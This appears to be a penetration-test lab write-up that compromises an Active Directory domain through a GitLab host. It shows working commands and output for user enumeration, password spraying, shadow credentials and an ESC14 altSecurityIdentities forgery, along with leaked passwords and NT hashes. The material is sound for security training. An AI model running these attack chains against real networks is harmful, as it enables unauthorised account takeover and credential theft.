# Objective and scope
You have been engaged to conduct an internal penetration test targeting a domain-joined Linux server and its underlying Domain Controller. The client wants to evaluate the true impact and potential blast radius if an unauthenticated attacker breaches the internal network.

The client has provided you with VPN access to their environment, but no other information.

# Host file setup
```python
sudo nxc smb 10.0.31.82 --generate-hosts-file /etc/hosts 
[sudo] password for kali: 
SMB         10.0.31.82      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:casper.hsm) (signing:True) (SMBv1:None) (Null Auth:True)
```

# Enumration
## Domain Controller
### Open ports
```python
nmap -p- -sT dc01.casper.hsm

Nmap scan report for dc01.casper.hsm (10.0.31.82)
Host is up (0.096s latency).
rDNS record for 10.0.31.82: DC01.casper.hsm
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49666/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49691/tcp open  unknown
49702/tcp open  unknown
49744/tcp open  unknown
54868/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 929.00 seconds
```

### Nmap
```python
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 -A --min-rate=1000 -sT dc01.casper.hsm
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-05 16:27 +0100
Nmap scan report for dc01.casper.hsm (10.0.31.82)
Host is up (0.095s latency).
rDNS record for 10.0.31.82: DC01.casper.hsm

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-05 15:27:24Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: casper.hsm, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.casper.hsm
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.casper.hsm
| Not valid before: 2026-07-26T08:04:06
|_Not valid after:  2027-07-26T08:04:06
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: casper.hsm, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.casper.hsm
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.casper.hsm
| Not valid before: 2026-07-26T08:04:06
|_Not valid after:  2027-07-26T08:04:06
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: casper.hsm, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.casper.hsm
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.casper.hsm
| Not valid before: 2026-07-26T08:04:06
|_Not valid after:  2027-07-26T08:04:06
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: casper.hsm, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.casper.hsm
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.casper.hsm
| Not valid before: 2026-07-26T08:04:06
|_Not valid after:  2027-07-26T08:04:06
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server
|_ssl-date: TLS randomness does not represent time
| rdp-ntlm-info: 
|   Target_Name: CASPER
|   NetBIOS_Domain_Name: CASPER
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: casper.hsm
|   DNS_Computer_Name: DC01.casper.hsm
|   DNS_Tree_Name: casper.hsm
|   Product_Version: 10.0.26100
|_  System_Time: 2026-08-05T15:28:16+00:00
| ssl-cert: Subject: commonName=DC01.casper.hsm
| Not valid before: 2026-07-25T07:13:00
|_Not valid after:  2027-01-24T07:13:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.99%I=7%D=8/5%Time=6A735661%P=x86_64-pc-linux-gnu%r(Ter
SF:minalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02\0
SF:\0\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 3 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Linux Server
### Open ports
```python
rustscan -a nix01.casper.hsm

Open 10.0.20.54:22
Open 10.0.20.54:80
Open 10.0.20.54:8060
Open 10.0.20.54:9094
```

Nmap was taking too long!

### Nmap
```python
nmap -p 22,80,8060,9094 -A --min-rate=1000 -sT nix01.casper.hsm
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-05 16:38 +0100
Nmap scan report for nix01.casper.hsm (10.0.20.54)
Host is up (0.095s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u10 (protocol 2.0)
| ssh-hostkey: 
|   256 79:c2:75:81:0e:45:1e:43:f8:b0:0d:57:af:73:80:01 (ECDSA)
|_  256 eb:04:d8:19:be:0a:10:2e:43:cd:e7:5c:c3:7f:06:fd (ED25519)
80/tcp   open  http    nginx
| http-robots.txt: 87 disallowed entries (15 shown)
| / /autocomplete/users /autocomplete/projects /search 
| /admin /profile /dashboard /users /api/v* /help /s/ /-/profile 
|_/-/profile/ /-/user_settings/ /-/ide/
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://nix01.casper.hsm/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
8060/tcp open  http    nginx 1.31.0
|_http-title: 404 Not Found
|_http-server-header: nginx/1.31.0
9094/tcp open  unknown
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Linux Server Service Enumeration

## SSH (22)
```python
ssh root@nix01.casper.hsm
The authenticity of host 'nix01.casper.hsm (10.0.20.54)' can't be established.
ED25519 key fingerprint is: SHA256:u3NhqmQvMrHTZGkskiKG8VmgnegfUnHX4vCAEfFrFjs
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'nix01.casper.hsm' (ED25519) to the list of known hosts.
root@nix01.casper.hsm's password:
```

Password based authentication!

## HTTP (80)
![](Pasted%20image%2020260805164236.png)

Looks like there is a GitLab instance

### Nuclei
```python
[graphql-alias-batching] [http] [info] http://nix01.casper.hsm/api/graphql
[graphql-ruby-detect] [http] [info] http://nix01.casper.hsm/api/graphql
[graphql-detect] [http] [info] http://nix01.casper.hsm//api/graphql [paths="/api/graphql"]
[oauth2-detect] [http] [info] http://nix01.casper.hsm/oauth/token
[waf-detect:nginxgeneric] [http] [info] http://nix01.casper.hsm/
[ssh-auth-methods] [javascript] [info] nix01.casper.hsm:22 ["["publickey","gssapi-keyex","gssapi-with-mic","password"]"]
[ssh-password-auth] [javascript] [info] nix01.casper.hsm:22
[ssh-server-enumeration] [javascript] [info] nix01.casper.hsm:22 ["SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u10"]
[ssh-sha1-hmac-algo] [javascript] [info] nix01.casper.hsm:22
[openssh-detect] [tcp] [info] nix01.casper.hsm:22 ["SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u10"]
[oidc-detect] [http] [info] http://nix01.casper.hsm/.well-known/openid-configuration
[keycloak-openid-config] [http] [info] http://nix01.casper.hsm/.well-known/openid-configuration
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://nix01.casper.hsm/users/sign_in
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://nix01.casper.hsm/users/sign_in
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://nix01.casper.hsm/users/sign_in
[missing-cookie-samesite-strict] [http] [info] http://nix01.casper.hsm/users/sign_in ["preferred_language=en; path=/ _gitlab_session=2025723a7a4e33fbc5fd67d197868df2; path=/; HttpOnly"]
[tech-detect:nginx] [http] [info] http://nix01.casper.hsm/users/sign_in
[tech-detect:nginx] [http] [info] http://nix01.casper.hsm/
[oauth-authorization-server-exposure] [http] [info] http://nix01.casper.hsm/.well-known/oauth-authorization-server
[robots-txt] [http] [info] http://nix01.casper.hsm/robots.txt
[graphql-get-method] [http] [info] http://nix01.casper.hsm/api/graphql?query={__typename}
[google-floc-disabled] [http] [info] http://nix01.casper.hsm/
[weak-csp-detect:missing-script-src] [http] [info] http://nix01.casper.hsm/ ["Content-Type: text/html; charset=utf-8"]
[weak-csp-detect:missing-object-src] [http] [info] http://nix01.casper.hsm/ ["Content-Type: text/html; charset=utf-8"]
[xss-deprecated-header] [http] [info] http://nix01.casper.hsm/ ["1; mode=block"]
[gitlab-detect] [http] [info] http://nix01.casper.hsm/users/sign_in
[gitlab-explore:gitlab-community] [http] [info] http://nix01.casper.hsm/api/v4/projects
```

There is nothing obvious i can do here!

![](Pasted%20image%2020260805170006.png)

Using the `Explore` button in the bottom left of the login page i get guest access and looks like there is an inactive project!

![](Pasted%20image%2020260805170240.png)

Searchign through the commits i find one for `Add new file` which looks to expose credentials for the `xjr` user

```python
xjr:xjrcat2026!
```

These credentials dont let me authenticate to the DC or SSH on the linux server

But they do get me access to the GitLab instance!

![](Pasted%20image%2020260805170908.png)

I have found another Project

![](Pasted%20image%2020260805171412.png)

Using the operate tab on the left i find a stopped environment which ones agains leaks credentials!

```python
fFvq52PzJpO98X8!
```

I am not given a username so ill use kerbrute to try an enumerate some users

# Password Spray leads to user compromise

```python
kerbrute userenum --dc dc01.casper.hsm -d casper.hsm /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/05/26 - Ronnie Flathers @ropnop

2026/08/05 16:53:52 >  Using KDC(s):
2026/08/05 16:53:52 >  	dc01.casper.hsm:88

2026/08/05 16:54:04 >  [+] VALID USERNAME:	jay@casper.hsm
2026/08/05 16:54:10 >  [+] VALID USERNAME:	administrator@casper.hsm
2026/08/05 16:54:18 >  [+] VALID USERNAME:	carlito@casper.hsm
2026/08/05 16:55:02 >  [+] VALID USERNAME:	Jay@casper.hsm
2026/08/05 16:55:28 >  [+] VALID USERNAME:	points@casper.hsm
2026/08/05 16:55:39 >  [+] VALID USERNAME:	JAY@casper.hsm
2026/08/05 16:56:08 >  [+] VALID USERNAME:	Administrator@casper.hsm
```

Found user `jay` `carlito` and `points`

I can try and spray the password against these users!

```python
nxc smb dc01.casper.hsm -u users.txt -p 'fFvq52PzJpO98X8!' --smb-timeout 5 --continue-on-success
SMB         10.0.31.82      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:casper.hsm) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.31.82      445    DC01             [-] casper.hsm\jay:fFvq52PzJpO98X8! STATUS_LOGON_FAILURE 
SMB         10.0.31.82      445    DC01             [-] casper.hsm\points:fFvq52PzJpO98X8! STATUS_LOGON_FAILURE 
SMB         10.0.31.82      445    DC01             [-] casper.hsm\carlito:fFvq52PzJpO98X8! STATUS_LOGON_FAILURE 
SMB         10.0.31.82      445    DC01             [+] casper.hsm\xjr:fFvq52PzJpO98X8!
```

I also assumed `xjr` would be a user so i added them to the list!

# Enumeration as `xjr`

## Shares
```python
nxc smb dc01.casper.hsm -u xjr -p 'fFvq52PzJpO98X8!' --smb-timeout 5 --shares
SMB         10.0.31.82      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:casper.hsm) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.31.82      445    DC01             [+] casper.hsm\xjr:fFvq52PzJpO98X8! 
SMB         10.0.31.82      445    DC01             [*] Enumerated shares
SMB         10.0.31.82      445    DC01             Share           Permissions     Remark
SMB         10.0.31.82      445    DC01             -----           -----------     ------
SMB         10.0.31.82      445    DC01             ADMIN$                          Remote Admin
SMB         10.0.31.82      445    DC01             C$                              Default share
SMB         10.0.31.82      445    DC01             IPC$            READ            Remote IPC
SMB         10.0.31.82      445    DC01             NETLOGON        READ            Logon server share 
SMB         10.0.31.82      445    DC01             SYSVOL          READ            Logon server share
```

No interesting access on shares!

## Users
```python
nxc smb dc01.casper.hsm -u xjr -p 'fFvq52PzJpO98X8!' --smb-timeout 5 --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
Administrator
Guest
krbtgt
DC01$
NIX01$
xjr
jags
jay
points
carlito
casper-gmsa$
```

Ill use `--rid-brute` to also get machine accounts, then use my linux cli skills to output this to a user file

There is also no lockout policy, so password spraying is something i can try!

## BloodyAD get writable
```python
bloodyAD --host dc01.casper.hsm -d casper.hsm -u xjr -p 'fFvq52PzJpO98X8!' get writable --detail

...[SNIP]...

distinguishedName: CN=jags,CN=Users,DC=casper,DC=hsm
msDS-KeyCredentialLink: WRITE

distinguishedName: CN=jay,CN=Users,DC=casper,DC=hsm
altSecurityIdentities: WRITE
```

`msDS-KeyCredentialLink: WRITE` allows me to apply shadow credentials!

`altSecurityIdentities: WRITE` means i can exploit ESC14

# Shadow Credentials leads to user compromise of `jags`

```python
certipy-ad shadow auto -u xjr@casper.hsm -p 'fFvq52PzJpO98X8!' -account 'jags'
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: CASPER.HSM.
[!] Use -debug to print a stacktrace
[*] Targeting user 'jags'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '41a526bd9975481694f23e02e964ad60'
[*] Adding Key Credential with device ID '41a526bd9975481694f23e02e964ad60' to the Key Credentials for 'jags'
[*] Successfully added Key Credential with device ID '41a526bd9975481694f23e02e964ad60' to the Key Credentials for 'jags'
[*] Authenticating as 'jags' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'jags@casper.hsm'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'jags.ccache'
[*] Wrote credential cache to 'jags.ccache'
[*] Trying to retrieve NT hash for 'jags'
[*] Restoring the old Key Credentials for 'jags'
[*] Successfully restored the old Key Credentials for 'jags'
[*] NT hash for 'jags': 68fc3adf1953f5e6851c0dd297562e08
```

Now i have this users NT hash

```python
nxc smb dc01.casper.hsm -u jags -H '68fc3adf1953f5e6851c0dd297562e08' --smb-timeout 5
SMB         10.0.31.82      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:casper.hsm) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.31.82      445    DC01             [+] casper.hsm\jags:68fc3adf1953f5e6851c0dd297562e08
```

This user is now compromised!

I will also now collect bloodhound data

# ESC14

```python
certipy-ad find -u jags@casper.hsm -hashes ':68fc3adf1953f5e6851c0dd297562e08' -dc-host dc01.casper.hsm -dc-ip 10.0.31.82 -stdout -enabled

Certificate Templates
  0
    Template Name                       : CasperCorp-User
    Display Name                        : CasperCorp-User
    Certificate Authorities             : casper-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 99 years
    Renewal Period                      : 69 years
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-07-28T00:54:27+00:00
    Template Last Modified              : 2026-07-28T03:57:22+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CASPER.HSM\CasperCorpCertificateUsers
                                          CASPER.HSM\Domain Admins
                                          CASPER.HSM\Enterprise Admins
      Object Control Permissions
        Owner                           : CASPER.HSM\Administrator
        Full Control Principals         : CASPER.HSM\Domain Admins
                                          CASPER.HSM\Enterprise Admins
        Write Owner Principals          : CASPER.HSM\Domain Admins
                                          CASPER.HSM\Enterprise Admins
        Write Dacl Principals           : CASPER.HSM\Domain Admins
                                          CASPER.HSM\Enterprise Admins
        Write Property Enroll           : CASPER.HSM\Domain Admins
                                          CASPER.HSM\Enterprise Admins
    [+] User Enrollable Principals      : CASPER.HSM\CasperCorpCertificateUsers
```

I found a template that the `jags` user can enroll in since they are a part of the group `CasperCorpCertificateUsers`

And also the user `xjr` has  `altSecurityIdentities: WRITE` on `jay` , so this meets all the requirements of ESC14

www.hackingarticles.in/adcs-esc14-write-access-on-altsecurityidentities/

```python
certipy-ad req -u jags@casper.hsm -hashes ':68fc3adf1953f5e6851c0dd297562e08' -ca casper-DC01-CA -template CasperCorp-User -target dc01.casper.hsm -debug

...[SNIP]...

[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.0.31.82[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.0.31.82[\pipe\cert]
[*] Request ID is 60
[*] Successfully requested certificate
[*] Got certificate without identity
[+] Found SID in security extension: 'S-1-5-21-247086266-1178499391-1139383971-1105'
[*] Certificate object SID is 'S-1-5-21-247086266-1178499391-1139383971-1105'
[*] Saving certificate and private key to 'jags.pfx'
[+] Attempting to write data to 'jags.pfx'
[+] Data written to 'jags.pfx'
[*] Wrote certificate and private key to 'jags.pfx'
```

First i have to request a certificate for `jags`

```python
openssl pkcs12 -in jags.pfx -clcerts -nokeys -out jagsupdated.pem 
Enter Import Password:

openssl x509 -in jagsupdated.pem -text -noout 
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            4d:00:00:00:3c:a6:1b:c8:af:85:82:4e:c1:00:00:00:00:00:3c
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: DC=hsm, DC=casper, CN=casper-DC01-CA
        Validity
            Not Before: Aug  5 16:52:11 2026 GMT
            Not After : Aug  5 17:02:11 2028 GMT
        Subject: DC=hsm, DC=casper, CN=Users, CN=jags
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:92:65:3b:48:fc:46:de:8e:e4:5c:aa:3c:54:6b:
                    2e:a4:ce:6f:85:1e:6e:5e:27:dc:57:ab:82:e6:fa:
                    0e:47:53:a6:fb:43:63:46:fe:4a:73:60:8d:cc:12:
                    17:74:1c:92:a5:d2:63:94:2a:7f:29:f4:31:5f:8a:
                    54:e6:45:ec:80:aa:54:83:e4:03:7a:01:ec:0c:79:
                    e1:42:60:3a:83:0d:ac:40:df:75:14:46:0c:4a:dd:
                    2c:f9:ab:6f:52:6a:05:41:4a:bc:a9:54:02:47:ca:
                    f9:8d:c8:1b:94:89:f5:7b:45:19:3c:ab:71:31:37:
                    4e:58:a0:66:ae:db:a0:1e:fe:b2:42:42:d5:a4:5f:
                    16:cf:1f:ee:33:94:f5:7b:6e:48:06:ec:75:e5:f3:
                    b5:74:a9:da:43:3b:e2:63:ac:46:00:76:b1:84:cf:
                    ae:9a:39:e2:43:c7:9a:57:7a:21:0b:23:c1:a3:b9:
                    e0:0f:aa:de:9b:fd:a3:f7:84:a9:c4:19:7f:8a:c1:
                    01:69:21:dd:00:03:bb:9c:35:7e:f4:55:c2:c2:90:
                    68:c4:1a:0f:d2:1f:c0:09:d5:19:04:87:ed:97:d7:
                    41:0f:55:83:3a:93:e5:b3:ff:26:5f:ee:85:ae:70:
                    f6:c0:54:61:c6:36:1d:6b:b3:c9:44:5e:e4:d8:f2:
                    77:9f
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Subject Key Identifier: 
                71:1E:D7:68:5D:C1:9A:2A:9A:15:A1:96:FE:35:2E:61:57:FB:6E:34
            X509v3 Authority Key Identifier: 
                3D:74:2B:AD:0D:74:BE:8D:92:22:32:73:64:55:CE:A5:6B:E3:EE:D9
            X509v3 CRL Distribution Points: 
                Full Name:
                  URI:ldap:///CN=casper-DC01-CA,CN=DC01,CN=CDP,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=casper,DC=hsm?certificateRevocationList?base?objectClass=cRLDistributionPoint

            Authority Information Access: 
                CA Issuers - URI:ldap:///CN=casper-DC01-CA,CN=AIA,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=casper,DC=hsm?cACertificate?base?objectClass=certificationAuthority
            X509v3 Key Usage: critical
                Digital Signature, Key Encipherment
            Microsoft certificate template: 
                0/.'+.....7................."...,.n...:...9..d...
            X509v3 Extended Key Usage: 
                TLS Web Client Authentication, E-mail Protection, Microsoft Encrypted File System
            Microsoft Application Policies Extension: 
                0&0
..+.......0
..+.......0..
+.....7
..
            Microsoft NTDS CA Extension: 
                0?.=.
+.....7..../.-S-1-5-21-247086266-1178499391-1139383971-1105
            S/MIME Capabilities: 
......0...+....0050...*.H..
..*.H..
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        62:d1:17:75:d3:03:4b:f3:24:5a:61:b3:80:2d:8d:cd:99:9b:
        7e:66:bf:a3:80:97:96:85:11:5f:5a:4e:9e:47:a9:80:7b:1d:
        2d:13:08:ce:c7:2a:2a:8e:27:80:bc:a2:36:85:7b:c7:df:2c:
        94:fd:c7:df:2b:37:2e:6e:90:f2:4b:ac:e6:7a:65:35:55:4c:
        e3:42:83:70:3a:a3:81:5f:2b:bc:c1:fe:7a:41:ab:bc:71:11:
        89:b1:56:59:9e:8d:d1:00:ec:8a:84:b5:14:25:d9:09:03:fa:
        e3:9f:ec:1f:99:34:f2:57:58:3e:3e:bd:eb:b1:2b:33:67:87:
        7b:85:2a:ec:70:bc:df:ad:c9:2c:cd:9f:0e:1b:38:b6:fc:8c:
        38:1b:10:f1:1d:e3:13:cf:c4:e3:5b:dc:8b:52:8b:28:e6:60:
        0f:af:f2:15:69:ac:67:e5:c5:8b:19:7d:46:3d:35:09:04:de:
        01:42:08:ab:50:80:40:31:85:32:22:1d:81:1d:6a:7d:a7:58:
        ae:85:e6:e1:5c:85:20:fe:15:ed:5c:79:4a:bd:7e:9f:db:0b:
        2b:64:93:e8:34:d2:8c:8d:3c:5a:b7:af:b9:c4:2c:cd:c1:1e:
        be:54:5f:ea:e4:2a:ea:2c:20:b7:11:bd:2a:a1:25:c8:6b:ca:
        81:1e:18:62
```

Then the next step is to convert the pfx to a pem file, then analyse it.

```python
Serial = 4d:00:00:00:3c:a6:1b:c8:af:85:82:4e:c1:00:00:00:00:00:3c
Issuer: DC=hsm, DC=casper, CN=casper-DC01-CA

x509:<I>issuer<SR>serial

x509:<I>DC=hsm,DC=casper,CN=casper-DC01-CA<SR>3c0000000000c14e8285afc81ba63c0000004d
```

Now using this output i can forge a new `altSecurityIdentities` value

I just remove the spaces in the issuer and the serial is just backwards without the colons

I can now write this value to `jay`s `altSecurityIdentities`

```python
bloodyAD --host dc01.casper.hsm -d casper.hsm -u xjr -p 'fFvq52PzJpO98X8!' set object jay altSecurityIdentities -v 'x509:<I>DC=hsm,DC=casper,CN=casper-DC01-CA<SR>3c0000000000c14e8285afc81ba63c0000004d'
[+] jay's altSecurityIdentities has been updated
```

Now this value is written to the correct value i can use certipy to get `jay`s hash

```python
certipy-ad auth -pfx jags.pfx -dc-ip 10.0.31.82 -domain casper.hsm -username jay
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     Security Extension SID: 'S-1-5-21-247086266-1178499391-1139383971-1105'
[!] Could not find identity in the provided certificate
[*] Using principal: 'jay@casper.hsm'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'jay.ccache'
[*] Wrote credential cache to 'jay.ccache'
[*] Trying to retrieve NT hash for 'jay'
[*] Got hash for 'jay@casper.hsm': aad3b435b51404eeaad3b435b51404ee:9b88ec231f4f0e5cb7d9edef1f399f6c
```

I now have the hash!

```python
nxc smb dc01.casper.hsm -u jay -H '9b88ec231f4f0e5cb7d9edef1f399f6c' --smb-timeout 5 
SMB         10.0.31.82      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:casper.hsm) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.31.82      445    DC01             [+] casper.hsm\jay:9b88ec231f4f0e5cb7d9edef1f399f6c
```

# Enumeration as `jay`

```python

```

